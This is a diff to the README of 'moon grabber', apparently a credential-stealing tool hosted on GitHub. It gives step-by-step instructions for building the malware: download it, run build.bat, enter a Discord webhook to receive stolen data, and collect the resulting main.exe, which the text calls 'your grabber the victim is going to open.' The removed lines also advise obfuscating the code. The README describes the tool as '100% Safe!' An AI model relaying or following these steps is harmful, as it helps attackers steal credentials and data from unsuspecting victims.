@@ -44,25 +44,17 @@
 ```sh-session
 1. Download moon grabber (https://codeload.github.com/Yuvi5001/moon-grabber/zip/refs/heads/main)
 
-2. Extract zip file
+2. Run build.bat
 
-3. Tap "install_python.bat" in moon folder if you do not have python
-
-4. Open `main.py` with any text editor such as notepad
-
-5. Replace the webhook in line 16
-
-6. Obfuscate your code: [https://pyobfuscate.com/](https://pyobfuscate.Com/pyd) (recommended)
-
-7. Run `convert-to-exe.py` to convert it to a .exe file type. (buggy)
-
-8. Check ur dist folder for your executable
-
+3. If you have python installed type y and press enter but if you don't have python press n to install.
+ 
+4. For people who pressed y: Enter your discord webhook.
+ 
+5. For people who pressed n: Rerun build.bat (if you pressed n and installed python) and this time press y and enter your discord webhook. 
+ 
+6. Go to the moon-stealer folder and you will find another folder called "dist", open it and you will see "main.exe" that is your grabber the victim is going to open. 
+ 
 Enjoy!
-
-NOTE: When Opening Moon-Grabber Just Tap "main.py" to Open Everytime!
-
-NOTE: Make sure you have Python 3.10+ and Added to Path.
 
 ```
 
@@ -78,7 +70,6 @@ NOTE: Make sure you have Python 3.10+ and Added to Path.
 - [x] - **100% Safe!**
 - [x] - **Fequently Updating**
 - [x] - **Might Have Some Bugs**
-- [x] - **Python Provided**
 
 ---
 
